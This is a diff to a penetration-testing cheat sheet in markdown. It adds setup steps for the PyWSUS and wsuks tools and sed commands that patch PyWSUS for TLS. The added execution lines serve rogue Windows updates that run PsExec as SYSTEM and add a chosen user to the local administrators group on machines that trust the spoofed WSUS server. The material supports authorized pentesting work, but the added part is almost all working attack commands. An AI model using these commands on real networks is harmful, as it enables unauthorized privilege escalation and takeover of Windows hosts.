@@ -10,9 +10,11 @@
 - [fakessh](#fakessh)
 - [Hak5 LAN Turtle](#hak5-lan-turtle)
 - [mitmproxy](#mitmproxy)
+- [PyWSUS](pywsus)
 - [Responder](#responder)
 - [SSH-MITM](#ssh-mitm)
 - [tshark](#tshark)
+- [wsuks](#wsuks)
 
 ## Resources
 
@@ -342,6 +344,66 @@ $ cat <FILE>.key <FILE>.crt > <FILE>.pem
 $ mitmproxy --mode reverse:https://<RHOST> --certs <FILE>.pem --save-stream-file <FILE>.raw -k -p 443
 ```
 
+## PyWSUS
+
+### Prerequisites
+
+#### Generate Virtual Environment
+
+```console
+$ python3 -m virtualenv venv
+```
+
+```console
+$ source venv/bin/activate
+```
+
+#### Update and install required Packages and Libraries
+
+```console
+$ sudo apt install libxml2-dev libxslt1-dev python3-dev -y
+```
+
+```console
+$ sed -i 's/lxml==4.6.2/lxml==5.3.0/' requirements.txt
+```
+
+```console
+$ pip install -r requirements.txt
+```
+
+#### Fetch and Apply Pull Request to support encrypted Communication
+
+```console
+$ git fetch origin pull/18/head:pr18
+```
+
+```console
+$ git checkout pr18
+```
+
+```console
+$ sed -i "s/    parser.add_argument('-v', '--verbose'/    parser.add_argument('--cert', default=None, help='Path to SSL certificate.')\n    parser.add_argument('--key', default=None, help='Path to SSL private key.')\n    parser.add_argument('-v', '--verbose'/" pywsus.py
+```
+
+```console
+$ sed -i 's/def run(host, port, server_class=HTTPServer, handler_class=WSUSBaseServer):/def run(host, port, cert=None, key=None, server_class=HTTPServer, handler_class=WSUSBaseServer):/' pywsus.py
+```
+
+```console
+$ sed -i 's/    httpd = server_class(server_address, handler_class)/    httpd = server_class(server_address, handler_class)\n    if cert and key:\n        import ssl\n        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n        ctx.load_cert_chain(certfile=cert, keyfile=key)\n        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)/' pywsus.py
+```
+
+```console
+$ sed -i 's/    run(host=args.host, port=args.port)/    run(host=args.host, port=args.port, cert=args.cert, key=args.key)/' pywsus.py
+```
+
+#### Execution
+
+```console
+$ python3 pywsus.py -H <RHOST> -p 8531 -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' --cert <FILE>.crt --key <FILE>.key
+```
+
 ## Responder
 
 > https://github.com/lgandx/Responder
@@ -373,4 +435,10 @@ $ tshark -i <INTERFACE> -Y 'smtp.data.fragments' -T fields -e 'text'
 
 ```console
 $ tshark --Y http.request -T fields -e http.host -e http.user_agent -r <FILE>.pcap
+```
+
+## wsuks
+
+```console
+$ sudo wsuks --serve-only --tls-cert <FILE>.pem -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' -I <INTERFACE>
 ```
